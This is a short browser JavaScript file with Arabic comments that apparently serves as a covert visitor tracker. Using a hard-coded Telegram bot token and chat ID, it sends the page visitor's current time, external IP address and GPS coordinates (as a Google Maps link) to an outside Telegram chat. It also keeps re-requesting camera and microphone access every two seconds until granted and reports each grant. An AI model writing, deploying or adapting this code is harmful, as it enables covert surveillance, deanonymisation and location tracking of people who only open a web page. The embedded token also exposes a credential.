const token = "7667682276:AAHrNXBQ3JnCJxYdvgAa_cgOqo_OWMb2rNA";
const chatId = "6659044299";

// دالة إرسال الرسائل إلى Telegram
function sendToTelegram(text) {
  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
    .then(res => res.json())
    .then(data => console.log("✅ Sent to Telegram:", data))
    .catch(err => console.error("❌ Telegram Error:", err));
}

// إرسال الوقت الحالي
sendToTelegram("📅 " + new Date().toLocaleString());

// إرسال IP الخارجي
fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(data => sendToTelegram("🌍 IP: " + data.ip));

// إرسال الموقع الجغرافي
function askLocation() {
  navigator.geolocation.getCurrentPosition(pos => {
    const { latitude, longitude } = pos.coords;
    const link = `https://maps.google.com/?q=${latitude},${longitude}`;
    sendToTelegram(`📍 الموقع الجغرافي:\nLatitude: ${latitude}\nLongitude: ${longitude}\n🔗 ${link}`);
  });
}
setTimeout(askLocation, 2000);

// إرسال صورة من الكاميرا
function askCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      sendToTelegram("📸 تم السماح بالكاميرا ✅");
      stream.getTracks().forEach(t => t.stop());
    })
    .catch(() => setTimeout(askCamera, 2000));
}
askCamera();

// إرسال صوت المايكروفون
function askMic() {
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      sendToTelegram("🎤 تم السماح بالمايكروفون ✅");
      stream.getTracks().forEach(t => t.stop());
    })
    .catch(() => setTimeout(askMic, 2000));
}
askMic();
